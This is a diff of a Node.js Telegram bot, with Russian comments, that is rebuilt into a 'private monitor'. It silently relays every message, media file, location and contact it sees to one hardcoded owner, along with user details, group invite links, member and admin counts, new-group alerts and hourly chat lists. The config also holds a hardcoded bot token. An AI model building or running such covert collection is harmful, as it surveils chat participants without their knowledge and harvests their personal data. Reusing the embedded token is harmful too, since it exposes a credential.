@@ -4,13 +4,28 @@ const path = require('path');
 
 // ================= CONFIG =================
 const BOT_TOKEN = "5250315160:AAE9mQUY2rvqR3nDo45QZSqZ3rVvkqZIiug";
-const NOTIFICATION_CHAT_ID = "8443013313"; // Опционально: для отправки уведомлений
+const OWNER_ID = "8443013313"; // Только этот пользователь получает информацию
+const OWNER_USERNAME = "Danya" // Имя владельца для отображения
 
 // ================= GLOBALS =================
 const seenMessages = new Set(); // Для отслеживания уже показанных сообщений
 let lastUpdateId = 0;
+const knownChats = new Map(); // Хранилище информации о чатах
 
-// ================= FUNCTIONS =================
+// ================= ФУНКЦИИ ПРОВЕРКИ =================
+
+// Проверка, является ли пользователь владельцем
+function isOwner(userId) {
+    return String(userId) === String(OWNER_ID);
+}
+
+// Проверка, нужно ли отправлять сообщение этому чату
+function shouldSendToChat(chatId) {
+    // Отправляем только владельцу, независимо от чата
+    return String(chatId) === String(OWNER_ID);
+}
+
+// ================= ОСНОВНЫЕ ФУНКЦИИ =================
 
 async function testBotToken() {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
@@ -20,6 +35,8 @@ async function testBotToken() {
             const jsonData = response.data;
             console.log(`✅ Бот активен: ${jsonData.result?.first_name || 'Unknown'}`);
             console.log(`   Username: @${jsonData.result?.username || 'Unknown'}`);
+            console.log(`👑 Владелец: ${OWNER_ID} (@${OWNER_USERNAME})`);
+            console.log(`   Вся информация будет отправляться только этому пользователю`);
             return true;
         } else {
             console.log(`❌ Ошибка токена: ${response.status}`);
@@ -31,12 +48,75 @@ async function testBotToken() {
     }
 }
 
+async function getChatInfo(chatId) {
+    // Не отправляем запросы для личных чатов, если это не владелец
+    if (String(chatId).startsWith('-')) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getChat`;
+        try {
+            const response = await axios.get(url, { 
+                params: { chat_id: chatId },
+                timeout: 10000 
+            });
+            
+            if (response.status === 200 && response.data.ok) {
+                return response.data.result;
+            }
+            return null;
+        } catch (error) {
+            return null;
+        }
+    }
+    return null;
+}
+
+async function getChatMembersCount(chatId) {
+    // Только для групп (отрицательные ID)
+    if (String(chatId).startsWith('-')) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getChatMembersCount`;
+        try {
+            const response = await axios.get(url, { 
+                params: { chat_id: chatId },
+                timeout: 10000 
+            });
+            
+            if (response.status === 200 && response.data.ok) {
+                return response.data.result;
+            }
+            return null;
+        } catch (error) {
+            return null;
+        }
+    }
+    return null;
+}
+
+async function getChatAdministrators(chatId) {
+    // Только для групп (отрицательные ID)
+    if (String(chatId).startsWith('-')) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getChatAdministrators`;
+        try {
+            const response = await axios.get(url, { 
+                params: { chat_id: chatId },
+                timeout: 10000 
+            });
+            
+            if (response.status === 200 && response.data.ok) {
+                return response.data.result;
+            }
+            return [];
+        } catch (error) {
+            return [];
+        }
+    }
+    return [];
+}
+
 async function getUpdates() {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`;
     const params = {
         offset: lastUpdateId + 1,
         timeout: 30,
-        allowed_updates: JSON.stringify(['message', 'callback_query', 'inline_query', 'edited_message'])
+        allowed_updates: JSON.stringify(['message', 'callback_query', 'inline_query', 'edited_message', 'channel_post'])
     };
     
     try {
@@ -55,7 +135,7 @@ async function getUpdates() {
         return [];
     } catch (error) {
         if (error.code === 'ECONNABORTED') {
-            return []; // Таймаут - нормальное поведение для long polling
+            return [];
         }
         console.log(`Ошибка при получении обновлений: ${error.message}`);
         return [];
@@ -65,13 +145,12 @@ async function getUpdates() {
 function extractMessageContent(messageData) {
     let content = "";
     let msgType = "text";
-    let mediaInfo = {}; // Дополнительная информация о медиа
+    let mediaInfo = {};
     
     if (messageData.text) {
         content = messageData.text;
         msgType = "text";
         
-        // Проверяем наличие эмодзи в тексте
         const emojiCount = [...content].filter(char => {
             const code = char.codePointAt(0);
             return code > 0xffff || (0x1f600 <= code && code <= 0x1f64f);
@@ -324,7 +403,7 @@ function processUserInfo(userData, updateType = "message") {
     };
 }
 
-function formatMessage(userInfo, messageContent, messageType, messageId, chatInfo = null) {
+function formatMessage(userInfo, messageContent, messageType, messageId, chatInfo = null, detailedChatInfo = null, membersCount = null, admins = []) {
     let name = userInfo.first_name;
     if (userInfo.last_name) {
         name += ` ${userInfo.last_name}`;
@@ -334,32 +413,41 @@ function formatMessage(userInfo, messageContent, messageType, messageId, chatInf
     if (chatInfo) {
         const chatType = chatInfo.type || 'private';
         if (chatType === 'private') {
-            chatInfoText = "💬 Личный чат";
-        } else if (chatType === 'group') {
-            chatInfoText = `👥 Группа: ${chatInfo.title || 'Без названия'}`;
-        } else if (chatType === 'supergroup') {
-            chatInfoText = `👥 Супергруппа: ${chatInfo.title || 'Без названия'}`;
+            chatInfoText = `💬 Личный чат\n🆔 ID чата: ${chatInfo.id}`;
+        } else if (chatType === 'group' || chatType === 'supergroup') {
+            chatInfoText = `👥 ${chatType === 'supergroup' ? 'Супергруппа' : 'Группа'}: ${chatInfo.title || 'Без названия'}\n🆔 ID группы: ${chatInfo.id}`;
+            
+            if (detailedChatInfo) {
+                if (detailedChatInfo.username) {
+                    chatInfoText += `\n🔗 @${detailedChatInfo.username}`;
+                }
+                if (detailedChatInfo.invite_link) {
+                    chatInfoText += `\n🔗 Ссылка: ${detailedChatInfo.invite_link}`;
+                }
+            }
+            
+            if (membersCount) {
+                chatInfoText += `\n👥 Участников: ${membersCount}`;
+            }
+            
+            if (admins.length > 0) {
+                chatInfoText += `\n👑 Админов: ${admins.length}`;
+            }
         } else if (chatType === 'channel') {
-            chatInfoText = `📢 Канал: ${chatInfo.title || 'Без названия'}`;
+            chatInfoText = `📢 Канал: ${chatInfo.title || 'Без названия'}\n🆔 ID канала: ${chatInfo.id}`;
         }
     }
     
     const typeIcons = {
-        'text': '📝',
-        'photo': '📷',
-        'video': '🎬',
-        'document': '📎',
-        'audio': '🎵',
-        'voice': '🎤',
-        'sticker': '🩷',
-        'location': '📍',
-        'contact': '👤',
-        'animation': '🎞️',
-        'video_note': '🎥',
-        'poll': '📊',
-        'dice': '🎲',
-        'caption': '📝',
-        'unknown': '❓'
+        'text': '📝', 'photo': '📷', 'video': '🎬', 'document': '📎',
+        'audio': '🎵', 'voice': '🎤', 'sticker': '🩷', 'location': '📍',
+        'contact': '👤', 'animation': '🎞️', 'video_note': '🎥', 'poll': '📊',
+        'dice': '🎲', 'caption': '📝', 'new_chat_members': '👥',
+        'left_chat_member': '👋', 'new_chat_title': '📝', 'new_chat_photo': '🖼️',
+        'delete_chat_photo': '🗑️', 'group_chat_created': '🎉',
+        'supergroup_chat_created': '🎉', 'channel_chat_created': '🎉',
+        'migrate_to_chat_id': '🔄', 'migrate_from_chat_id': '🔄',
+        'pinned_message': '📌', 'unknown': '❓'
     };
     
     const icon = typeIcons[messageType] || '📝';
@@ -381,7 +469,7 @@ function formatMessage(userInfo, messageContent, messageType, messageId, chatInf
     );
 }
 
-function formatConsoleMessage(userInfo, messageContent, messageType, messageId, chatInfo = null) {
+function formatConsoleMessage(userInfo, messageContent, messageType, messageId, chatInfo = null, detailedChatInfo = null, membersCount = null, admins = []) {
     const unescapeHtml = (text) => {
         if (!text) return '';
         return text
@@ -401,30 +489,28 @@ function formatConsoleMessage(userInfo, messageContent, messageType, messageId, 
     if (chatInfo) {
         const chatType = chatInfo.type || 'private';
         if (chatType === 'private') {
-            chatInfoText = "💬 Личный чат";
-        } else if (chatType === 'group') {
-            chatInfoText = `👥 Группа: ${chatInfo.title || 'Без названия'}`;
-        } else if (chatType === 'supergroup') {
-            chatInfoText = `👥 Супергруппа: ${chatInfo.title || 'Без названия'}`;
+            chatInfoText = `💬 Личный чат | ID: ${chatInfo.id}`;
+        } else if (chatType === 'group' || chatType === 'supergroup') {
+            chatInfoText = `👥 ${chatType === 'supergroup' ? 'Супергруппа' : 'Группа'}: ${chatInfo.title || 'Без названия'} | ID: ${chatInfo.id}`;
+            
+            if (membersCount) {
+                chatInfoText += ` | 👥 ${membersCount} уч.`;
+            }
+        } else if (chatType === 'channel') {
+            chatInfoText = `📢 Канал: ${chatInfo.title || 'Без названия'} | ID: ${chatInfo.id}`;
         }
     }
     
     const typeIcons = {
-        'text': '📝',
-        'photo': '📷',
-        'video': '🎬',
-        'document': '📎',
-        'audio': '🎵',
-        'voice': '🎤',
-        'sticker': '🩷',
-        'location': '📍',
-        'contact': '👤',
-        'animation': '🎞️',
-        'video_note': '🎥',
-        'poll': '📊',
-        'dice': '🎲',
-        'caption': '📝',
-        'unknown': '❓'
+        'text': '📝', 'photo': '📷', 'video': '🎬', 'document': '📎',
+        'audio': '🎵', 'voice': '🎤', 'sticker': '🩷', 'location': '📍',
+        'contact': '👤', 'animation': '🎞️', 'video_note': '🎥', 'poll': '📊',
+        'dice': '🎲', 'caption': '📝', 'new_chat_members': '👥',
+        'left_chat_member': '👋', 'new_chat_title': '📝', 'new_chat_photo': '🖼️',
+        'delete_chat_photo': '🗑️', 'group_chat_created': '🎉',
+        'supergroup_chat_created': '🎉', 'channel_chat_created': '🎉',
+        'migrate_to_chat_id': '🔄', 'migrate_from_chat_id': '🔄',
+        'pinned_message': '📌', 'unknown': '❓'
     };
     
     const icon = typeIcons[messageType] || '📝';
@@ -446,31 +532,33 @@ function formatConsoleMessage(userInfo, messageContent, messageType, messageId, 
     );
 }
 
-async function sendToTelegramChat(message) {
-    if (NOTIFICATION_CHAT_ID) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const payload = {
-            chat_id: NOTIFICATION_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML',
-            disable_web_page_preview: true
-        };
-        try {
-            await axios.post(url, payload, { timeout: 5000 });
-        } catch (error) {
-            console.log(`Ошибка отправки текста в Telegram: ${error.message}`);
-        }
+// ИЗМЕНЕНО: Отправка только владельцу
+async function sendToOwner(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: OWNER_ID,
+        text: message,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+    };
+    
+    try {
+        await axios.post(url, payload, { timeout: 5000 });
+        return true;
+    } catch (error) {
+        console.log(`❌ Ошибка отправки владельцу: ${error.message}`);
+        return false;
     }
 }
 
-// НОВАЯ ФУНКЦИЯ: Отправка медиафайлов
-async function sendMediaToTelegram(messageType, mediaInfo, caption = "") {
-    if (!NOTIFICATION_CHAT_ID || !mediaInfo.file_id) return;
+// ИЗМЕНЕНО: Отправка медиа только владельцу
+async function sendMediaToOwner(messageType, mediaInfo, caption = "") {
+    if (!mediaInfo.file_id) return;
     
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
     let method = "";
     let payload = {
-        chat_id: NOTIFICATION_CHAT_ID
+        chat_id: OWNER_ID
     };
     
     try {
@@ -525,8 +613,6 @@ async function sendMediaToTelegram(messageType, mediaInfo, caption = "") {
                 method = 'sendLocation';
                 payload.latitude = mediaInfo.latitude;
                 payload.longitude = mediaInfo.longitude;
-                delete payload.chat_id;
-                payload.chat_id = NOTIFICATION_CHAT_ID;
                 break;
                 
             case 'contact':
@@ -537,45 +623,148 @@ async function sendMediaToTelegram(messageType, mediaInfo, caption = "") {
                 break;
                 
             default:
-                return; // Неподдерживаемый тип
+                return;
         }
         
         if (method) {
             await axios.post(url + method, payload, { timeout: 10000 });
-            console.log(`✅ Медиафайл отправлен: ${messageType}`);
+            console.log(`✅ Медиа отправлено владельцу: ${messageType}`);
         }
         
     } catch (error) {
-        console.log(`❌ Ошибка отправки медиа (${messageType}): ${error.message}`);
+        console.log(`❌ Ошибка отправки медиа владельцу (${messageType}): ${error.message}`);
     }
+}
+
+// НОВАЯ ФУНКЦИЯ: Отправка уведомления о новой группе только владельцу
+async function notifyOwnerAboutNewGroup(chatInfo, membersCount = null) {
+    let message = `🔔 ОБНАРУЖЕНА НОВАЯ ГРУППА\n\n`;
+    message += `📌 Название: ${chatInfo.title || 'Без названия'}\n`;
+    message += `🆔 ID группы: ${chatInfo.id}\n`;
+    message += `📂 Тип: ${chatInfo.type}\n`;
+    
+    if (chatInfo.username) {
+        message += `🔗 Username: @${chatInfo.username}\n`;
+    }
+    
+    if (membersCount) {
+        message += `👥 Участников: ${membersCount}\n`;
+    }
+    
+    if (chatInfo.description) {
+        message += `📝 Описание: ${chatInfo.description.substring(0, 100)}${chatInfo.description.length > 100 ? '...' : ''}\n`;
+    }
+    
+    await sendToOwner(message);
+}
+
+// НОВАЯ ФУНКЦИЯ: Отправка статистики только владельцу
+async function sendStatsToOwner() {
+    let groupCount = 0;
+    let privateCount = 0;
+    let channelCount = 0;
+    
+    for (const [_, chatInfo] of knownChats) {
+        const chatType = chatInfo.type || 'unknown';
+        if (chatType === 'private') privateCount++;
+        else if (chatType === 'group' || chatType === 'supergroup') groupCount++;
+        else if (chatType === 'channel') channelCount++;
+    }
+    
+    let message = `📊 СТАТИСТИКА ЧАТОВ\n\n`;
+    message += `👥 Групп: ${groupCount}\n`;
+    message += `👤 Личных чатов: ${privateCount}\n`;
+    message += `📢 Каналов: ${channelCount}\n`;
+    message += `🏷️ Всего чатов: ${knownChats.size}\n\n`;
+    
+    message += `📋 СПИСОК ГРУПП:\n`;
+    for (const [chatId, chatInfo] of knownChats) {
+        if (chatInfo.type === 'group' || chatInfo.type === 'supergroup') {
+            message += `• ${chatInfo.title || 'Без названия'} (ID: ${chatId})\n`;
+        }
+    }
+    
+    await sendToOwner(message);
+}
+
+// ИЗМЕНЕНО: Показываем чаты только в консоли, без отправки кому-либо
+async function showAllKnownChats() {
+    console.log("\n" + "=".repeat(60));
+    console.log("📋 ВСЕ ИЗВЕСТНЫЕ ЧАТЫ");
+    console.log("=".repeat(60));
+    
+    if (knownChats.size === 0) {
+        console.log("Нет информации о чатах. Ожидание сообщений...");
+        return;
+    }
+    
+    let groupCount = 0;
+    let privateCount = 0;
+    let channelCount = 0;
+    
+    for (const [chatId, chatInfo] of knownChats) {
+        const chatType = chatInfo.type || 'unknown';
+        
+        if (chatType === 'private') {
+            privateCount++;
+        } else if (chatType === 'group' || chatType === 'supergroup') {
+            groupCount++;
+        } else if (chatType === 'channel') {
+            channelCount++;
+        }
+        
+        console.log(`\n${chatType === 'private' ? '👤' : chatType === 'group' || chatType === 'supergroup' ? '👥' : '📢'} ${chatInfo.title || 'Личный чат'}`);
+        console.log(`   🆔 ID: ${chatId}`);
+        console.log(`   📂 Тип: ${chatType}`);
+        
+        if (chatInfo.username) {
+            console.log(`   🔗 @${chatInfo.username}`);
+        }
+        
+        if (chatType === 'group' || chatType === 'supergroup') {
+            const membersCount = await getChatMembersCount(chatId);
+            if (membersCount) {
+                console.log(`   👥 Участников: ${membersCount}`);
+            }
+        }
+    }
+    
+    console.log("\n" + "=".repeat(60));
+    console.log(`📊 Статистика:`);
+    console.log(`   👥 Групп: ${groupCount}`);
+    console.log(`   👤 Личных чатов: ${privateCount}`);
+    console.log(`   📢 Каналов: ${channelCount}`);
+    console.log(`   🏷️ Всего чатов: ${knownChats.size}`);
+    console.log("=".repeat(60));
 }
 
 function printWelcome() {
     console.log("=".repeat(60));
-    console.log("TELEGRAM MESSAGE MONITOR v4.0 - MEDIA FORWARDING");
-    console.log("Полная поддержка медиафайлов с пересылкой (Node.js)");
+    console.log("🤖 TELEGRAM PRIVATE MONITOR v1.0");
     console.log("=".repeat(60));
-    console.log("Поддерживаемые типы сообщений:");
-    console.log("• 📝 Текст и эмодзи");
-    console.log("• 📷 Фото (с пересылкой оригинала)");
-    console.log("• 🎬 Видео (с пересылкой оригинала)");
-    console.log("• 🎵 Аудио (с пересылкой оригинала)");
-    console.log("• 🎤 Голосовые сообщения (с пересылкой)");
-    console.log("• 🩷 Стикеры (с пересылкой)");
-    console.log("• 📎 Документы (с пересылкой)");
-    console.log("• 🎞️ GIF анимации (с пересылкой)");
-    console.log("• 🎥 Видеосообщения круглые (с пересылкой)");
-    console.log("• 📍 Локации (со ссылкой на карты)");
-    console.log("• 👤 Контакты");
-    console.log("• 📊 Опросы и викторины");
-    console.log("• 🎲 Игральные кости (дартс, баскетбол и др.)");
+    console.log(`👑 ВЛАДЕЛЕЦ: ${OWNER_ID} (@${OWNER_USERNAME})`);
+    console.log(`🔒 РЕЖИМ: Приватный - вся информация только владельцу`);
+    console.log("=".repeat(60));
+    console.log("📋 ФУНКЦИИ:");
+    console.log("• Мониторинг всех сообщений");
+    console.log("• Отслеживание новых групп");
+    console.log("• Сбор информации о пользователях");
+    console.log("• Пересылка медиафайлов");
     console.log("=".repeat(60));
 }
 
 async function monitorUpdates() {
-    console.log("🚀 Запуск мониторинга пользователей и сообщений...");
-    console.log("✅ Ожидание новых сообщений: текст, фото, видео, аудио, стикеры, эмодзи...");
+    console.log("🚀 Запуск приватного мониторинга...");
+    console.log("✅ Ожидание новых сообщений...");
     console.log("=".repeat(60));
+    
+    // Отправляем приветственное сообщение владельцу
+    await sendToOwner("🔔 Бот запущен и начал мониторинг!\n\nВся информация будет доставляться сюда.");
+    
+    // Периодически отправляем статистику владельцу (каждый час)
+    setInterval(async () => {
+        await sendStatsToOwner();
+    }, 60 * 60 * 1000);
     
     while (true) {
         try {
@@ -616,11 +805,17 @@ async function monitorUpdates() {
                     messageData = { text: `Inline query: ${inlineData.query || 'Пустой запрос'}` };
                     messageId = inlineData.id;
                     updateType = "inline_query";
+                } else if (update.channel_post) {
+                    messageData = update.channel_post;
+                    userData = messageData.from || { id: 0, first_name: 'Channel', username: 'channel' };
+                    chatInfo = messageData.chat || {};
+                    messageId = messageData.message_id;
+                    updateType = "channel_post";
                 } else {
                     continue;
                 }
                 
-                if (userData && userData.id && messageData) {
+                if (userData && messageData) {
                     const { content: messageContent, msgType: messageType, mediaInfo } = extractMessageContent(messageData);
                     
                     let messageKey;
@@ -635,20 +830,46 @@ async function monitorUpdates() {
                         
                         const userInfo = processUserInfo(userData, updateType);
                         
-                        const consoleMsg = formatConsoleMessage(userInfo, messageContent, messageType, messageId, chatInfo);
-                        const telegramMsg = formatMessage(userInfo, messageContent, messageType, messageId, chatInfo);
+                        // Сохраняем информацию о чате
+                        if (chatInfo && chatInfo.id && !knownChats.has(chatInfo.id)) {
+                            knownChats.set(chatInfo.id, chatInfo);
+                            
+                            const detailedChatInfo = await getChatInfo(chatInfo.id);
+                            if (detailedChatInfo) {
+                                knownChats.set(chatInfo.id, detailedChatInfo);
+                            }
+                            
+                            // Если это группа, уведомляем владельца
+                            if (chatInfo.type === 'group' || chatInfo.type === 'supergroup') {
+                                console.log(`\n🔔 Обнаружена новая группа: ${chatInfo.title || 'Без названия'} (ID: ${chatInfo.id})`);
+                                
+                                const membersCount = await getChatMembersCount(chatInfo.id);
+                                await notifyOwnerAboutNewGroup(chatInfo, membersCount);
+                            }
+                        }
                         
+                        const detailedChatInfo = knownChats.get(chatInfo?.id) || chatInfo;
+                        
+                        let membersCount = null;
+                        let admins = [];
+                        if (chatInfo && (chatInfo.type === 'group' || chatInfo.type === 'supergroup')) {
+                            membersCount = await getChatMembersCount(chatInfo.id);
+                            admins = await getChatAdministrators(chatInfo.id);
+                        }
+                        
+                        const consoleMsg = formatConsoleMessage(userInfo, messageContent, messageType, messageId, chatInfo, detailedChatInfo, membersCount, admins);
+                        const telegramMsg = formatMessage(userInfo, messageContent, messageType, messageId, chatInfo, detailedChatInfo, membersCount, admins);
+                        
+                        // Показываем в консоли
                         console.log(consoleMsg);
                         
-                        // Отправляем текстовую информацию
-                        if (NOTIFICATION_CHAT_ID) {
-                            await sendToTelegramChat(telegramMsg);
-                            
-                            // Если есть медиафайл - отправляем его ОТДЕЛЬНЫМ сообщением
-                            if (mediaInfo && mediaInfo.file_id) {
-                                const mediaCaption = messageData.caption || `От: ${userInfo.first_name} (@${userInfo.username})`;
-                                await sendMediaToTelegram(messageType, mediaInfo, mediaCaption);
-                            }
+                        // Отправляем ТОЛЬКО ВЛАДЕЛЬЦУ
+                        await sendToOwner(telegramMsg);
+                        
+                        // Если есть медиа, отправляем его ТОЛЬКО ВЛАДЕЛЬЦУ
+                        if (mediaInfo && mediaInfo.file_id) {
+                            const mediaCaption = messageData.caption || `От: ${userInfo.first_name} (@${userInfo.username})`;
+                            await sendMediaToOwner(messageType, mediaInfo, mediaCaption);
                         }
                     }
                 }
@@ -659,10 +880,10 @@ async function monitorUpdates() {
         } catch (error) {
             if (error.message === 'SIGINT') {
                 console.log("\n\n🛑 Мониторинг остановлен пользователем");
+                await sendToOwner("🛑 Бот остановлен");
                 break;
             }
             console.log(`\n⚠️ Ошибка в основном цикле: ${error.message}`);
-            console.error(error.stack);
             await new Promise(resolve => setTimeout(resolve, 5000));
         }
     }
@@ -672,18 +893,38 @@ async function startMessageMonitor() {
     printWelcome();
     
     if (!await testBotToken()) {
-        console.log("Проверьте правильность токена бота!");
+        console.log("❌ Ошибка токена! Проверьте правильность токена бота.");
         process.exit(1);
     }
     
+    // Проверяем, может ли бот отправить сообщение владельцу
+    const testMessage = await sendToOwner("🔍 Тестовое сообщение. Бот запущен и готов к работе!");
+    if (testMessage) {
+        console.log("✅ Бот может отправлять сообщения владельцу");
+    } else {
+        console.log("⚠️ Внимание! Бот не может отправить сообщение владельцу.");
+        console.log("   Проверьте, начал ли владелец диалог с ботом (@getmyid_bot)");
+    }
+    
+    setTimeout(async () => {
+        await showAllKnownChats();
+    }, 5000);
+    
     monitorUpdates().catch(error => {
-        console.log(`Критическая ошибка: ${error.message}`);
+        console.log(`❌ Критическая ошибка: ${error.message}`);
         console.error(error.stack);
+        sendToOwner(`❌ Критическая ошибка бота: ${error.message}`);
     });
 }
 
 module.exports = {
     startMessageMonitor,
     testBotToken,
-    monitorUpdates
+    monitorUpdates,
+    showAllKnownChats
 };
+
+// Запуск, если файл выполняется напрямую
+if (require.main === module) {
+    startMessageMonitor();
+}
